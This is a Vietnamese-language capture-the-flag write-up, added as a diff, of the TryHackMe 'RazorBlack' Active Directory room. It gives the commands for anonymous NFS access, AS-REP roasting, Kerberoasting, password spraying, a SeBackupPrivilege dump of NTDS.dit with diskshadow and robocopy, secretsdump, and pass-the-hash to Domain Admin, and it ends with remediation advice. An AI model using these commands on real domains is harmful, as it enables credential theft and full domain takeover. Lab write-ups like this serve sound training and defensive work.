@@ -1,0 +1,173 @@
+---
+title: 'RazorBlack'
+description: 'An anonymous NFS share leaks a staff list, AS-REP roasting and Kerberoasting hand over two accounts, and SeBackupPrivilege is used to dump NTDS.dit for full domain compromise.'
+date: 2025-12-02
+platform: tryhackme
+room: 'RazorBlack'
+roomUrl: 'https://tryhackme.com/room/raz0rblack'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'asrep-roasting'
+  - 'kerberoasting'
+  - 'pass-the-hash'
+  - 'smb'
+  - 'nfs'
+  - 'ntds'
+  - 'windows'
+  - 'password-cracking'
+vulnClasses:
+  - 'as-rep roasting'
+  - 'kerberoasting'
+  - 'weak credentials'
+  - 'password reuse'
+  - 'excessive backup privilege'
+  - 'authentication bypass'
+translation: done
+draft: false
+---
+
+## **TryHackMe: RazorBlack — Rò Rỉ NFS, AS-REP Roasting, và SeBackupPrivilege Dẫn Đến Chiếm Toàn Bộ Domain**
+
+_Bài viết tường thuật lại phòng Active Directory "RazorBlack" trên TryHackMe. Một NFS share cho phép truy cập ẩn danh làm lộ danh sách nhân viên, AS-REP roasting và Kerberoasting lấy được hai tài khoản ít quyền, và SeBackupPrivilege cho phép chúng ta mang cả NTDS.dit ra ngoài — kết thúc bằng Domain Admin, cùng một loạt flag "mục tiêu bổ sung" trên đường đi._
+
+> Các flag, mật khẩu đã bẻ khóa, và giá trị hash NTLM/Kerberos đều đã được ẩn đi. RazorBlack là một phòng lab được TryHackMe cho phép khai thác hợp pháp; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dưới dạng `<redacted>` là giá trị thật trên máy nhưng đã bị giữ lại, không công khai.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một **NFS export truy cập ẩn danh** làm lộ một file Excel chứa tên nhân viên → dựng danh sách username từ đó và chạy **AS-REP roasting** bẻ khóa được mật khẩu của `twilliams` → mật khẩu đó bị dùng lại (reuse) cho một service account có thể **Kerberoast**, `xyan1d3`, người này nằm trong nhóm **Backup Operators** → `SeBackupPrivilege` cho phép dùng `diskshadow` + `robocopy` để copy ra `ntds.dit` và hive `SYSTEM` → `secretsdump` khôi phục toàn bộ NTLM hash của domain, kể cả của Administrator → pass-the-hash qua WinRM → **Domain Admin**.
+
+NFS ẩn danh → danh sách nhân viên → AS-REP roast → password reuse → Kerberoast → SeBackupPrivilege → dump NTDS → Domain Admin.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export DOMAIN=raz0rblack.thm
+export DC=haven-dc
+```
+
+`HAVEN-DC` là domain controller của `raz0rblack.thm`, mở toàn bộ cổng đặc trưng của AD — Kerberos (88), LDAP (389), SMB (445), WinRM (5985), RDP (3389) — cùng một NFS share được export (2049).
+
+### **Lỗ hổng: mọi thứ bắt đầu từ một export mà không ai khóa lại**
+
+<Callout type="insight">
+
+Một NFS export cho "everyone" đọc được là một bàn đạp kinh điển trong AD — nó hiếm khi chứa thẳng mật khẩu, nhưng rất thường chứa tên người, và danh sách username của một domain lại chính là thứ mọi cuộc tấn công Kerberos sau đó đều cần.
+
+</Callout>
+
+```text
+showmount -e $DC
+# Export list for raz0rblack.thm: /users (everyone)
+mount $DC:/users /mnt/users
+```
+
+Share này chứa một file flag cho một user (`sbradley`) và một file `employee_status.xlsx` liệt kê đầy đủ họ tên toàn bộ nhân viên. Chuyển "Tên Họ" sang dạng viết tắt (ký tự đầu tên ghép với họ) giúp dựng một danh sách username đủ tốt để nuôi mọi cuộc tấn công sau đó.
+
+### **Bước 1 — AS-REP roasting tìm ra user không yêu cầu Kerberos pre-auth**
+
+```text
+impacket-GetNPUsers -no-pass $DOMAIN/ -usersfile modified_names.txt -format hashcat -outputfile hashes.txt
+# twilliams không yêu cầu pre-authentication -> bắt được hash AS-REP
+hashcat -m 18200 -a 0 hashes.txt rockyou.txt
+# twilliams -> <redacted-password>
+```
+
+### **Bước 2 — password reuse mở khóa một service account Kerberoast được**
+
+```text
+impacket-GetUserSPNs $DOMAIN/twilliams:'<redacted-password>' -dc-ip $DC -request -outputfile kerb.hash
+# tìm thấy SPN cho xyan1d3 (thành viên nhóm Remote Management Users)
+hashcat -m 13100 -a 0 kerb.hash rockyou.txt
+# xyan1d3 -> <redacted-password>
+```
+
+```text
+nxc winrm $DC -u xyan1d3 -p '<redacted-password>'
+# raz0rblack.thm\xyan1d3:<redacted-password> (Pwn3d!)
+```
+
+### **Bước 3 — SeBackupPrivilege dump NTDS.dit mà không cần quyền admin**
+
+`xyan1d3` thuộc nhóm **Backup Operators**, nhóm này mang theo `SeBackupPrivilege`/`SeRestorePrivilege` — đủ để backup toàn bộ filesystem mà không cần là domain admin.
+
+<Callout type="insight">
+
+Đây là hướng khai thác SeBackupPrivilege đã được ghi chép đầy đủ (shadow-copy volume, rồi chỉ cần copy NTDS.dit ra từ bản shadow) — không cần quyền admin, chỉ cần quyền backup-operator mà nhiều tổ chức vẫn cấp phát quá rộng tay.
+
+</Callout>
+
+```text
+# upload một script diskshadow, sau đó:
+diskshadow /s diskshadow.txt      # shadow-copy ổ C: và expose nó thành E:
+robocopy /b E:\Windows\ntds . ntds.dit
+reg save HKLM\SYSTEM .\SYSTEM
+```
+
+### **Bước 4 — secretsdump + pass-the-hash để lấy Domain Admin**
+
+```text
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm
+# Administrator:500:...:<redacted-ntlm-hash>:::
+```
+
+```text
+evil-winrm -i $DC -u administrator -H <redacted-ntlm-hash>
+# whoami -> raz0rblack\administrator (Domain Admins, Enterprise Admins)
+```
+
+### **Mục tiêu bổ sung — săn từng flag một**
+
+Phòng này còn một loạt flag phụ ngoài đường tấn công chính; mỗi flag là một bài học nhỏ riêng.
+
+- **Flag của Steven** nằm không mã hóa ngay trong NFS share, tìm thấy ngay từ lần mount `/users` đầu tiên.
+- **Flag của Xyan1d3** nằm trong một file XML `PSCredential` ở profile của user. Trường `UserName` chỉ là một câu trêu đùa ("Nope your flag is not here") nhưng trường `Password` đã mã hóa lại đọc được bằng chính khóa DPAPI của user:
+
+```text
+$credential = Import-Clixml -Path .\xyan1d3.xml
+$credential.GetNetworkCredential().Password
+# -> <redacted-flag>
+```
+
+- **Flag root của Administrator** nằm trong một file PSCredential XML thứ hai, nhưng import bị lỗi — vì blob DPAPI đã bị mã lại thành một chuỗi hex thuần thay vì giữ nguyên dạng blob đã mã hóa. Decode chuỗi hex đó (ví dụ bằng CyberChef) sẽ trực tiếp cho ra thông điệp dạng plaintext kèm flag, không cần khóa DPAPI.
+- **"What is the complete top secret?"** là một câu đố giấu trong ảnh `top_secret.png`, tìm thấy bằng tìm kiếm tên file đệ quy (`Get-ChildItem -Include *secret*`); ảnh thể hiện một chuỗi thoát `vim` gõ nửa chừng, và câu trả lời mong đợi chính là lệnh đúng (`:wq`).
+- **Flag của Ljudmila** cần một bàn đạp thứ hai: phun mật khẩu đã bẻ khóa của `twilliams` qua toàn bộ danh sách username trên SMB phát hiện ra `sbradley` dùng cùng mật khẩu, chỉ là đã hết hạn. `smbpasswd` cho phép đặt mật khẩu mới cho `sbradley` mà không cần biết mật khẩu cũ, từ đó có quyền SMB vào share `trash`. Share này chứa một đoạn chat log nhắc tới **CVE-2020-1472 (Zerologon)** và một file zip có mật khẩu chứa một cặp `ntds.dit`/hive `SYSTEM` khác, cũ hơn. Bẻ khóa mật khẩu zip bằng `zip2john`/`john` rồi chạy lại `secretsdump` trên các file đó thu được một tập NTLM hash lớn hơn nhiều của domain. Phun các hash đó vào `lvetrova` tìm ra hash khớp, và cũng dùng lại chiêu PSCredential-XML để lấy flag của cô ấy.
+- **Flag của Tyson** đơn giản chỉ là một file trong home của `twilliams` với cái tên cố tình vô lý (`definitely_..._not_a_flag.exe`) nhưng thực ra, dù tên trông vậy, lại chỉ là văn bản thuần.
+
+### **Mức độ ảnh hưởng**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Chiếm toàn bộ domain, và cả chuỗi khai thác không cần đến bất kỳ credential ban đầu nào:
+
+- **Truy cập NFS ẩn danh làm lộ một danh sách username dùng được**, nuôi mọi cuộc tấn công Kerberos tiếp theo.
+- **Password reuse giữa một tài khoản người dùng và một service account** biến một lần bẻ khóa AS-REP thành quyền truy cập Kerberoasting.
+- **Việc cấp quyền Backup Operators quá rộng** cho phép một tài khoản ít quyền lấy ra toàn bộ database Active Directory mà không cần chạm trực tiếp vào quyền Domain Admin.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Khóa chặt các NFS export** chỉ cho host cụ thể, không bao giờ để `everyone`, và không lưu dữ liệu nhạy cảm/liên quan credential (danh sách nhân viên) trên đó.
+2. **Bắt buộc Kerberos pre-authentication cho mọi tài khoản** và cấm password reuse giữa tài khoản người dùng và service account bằng chính sách quản lý/lưu trữ mật khẩu.
+3. **Coi Backup Operators là Tier-0.** Thành viên nhóm này tương đương Domain Admin nếu xét theo `SeBackupPrivilege`; hạn chế chặt như các nhóm admin và giám sát việc dùng `diskshadow`/`vssadmin`.
+
+</Callout>
+
+### **Những điều rút ra**
+
+- **Một share chỉ đọc vẫn là một mỏ vàng để recon.** Chỉ cần tên người đã đủ để chạy AS-REP roasting và Kerberoasting trên cả một domain.
+- **Password reuse là sợi dây nối các tài khoản tưởng như không liên quan.** Một mật khẩu người dùng bị bẻ khóa đã mở khóa một service account có quyền thật.
+- **Quyền "backup" trong AD tương đương root.** Bất kỳ quyền nào đọc được file tùy ý, kể cả database của domain, đều phải được coi là credential Tier-0.
+
+Cảm ơn đã đọc. RazorBlack gộp gần như mọi lỗi cấu hình AD kinh điển vào một máy, và rất đáng để chơi lại từng bước một cách chậm rãi — các flag mục tiêu phụ dạy được nhiều không kém gì đường tấn công chính.
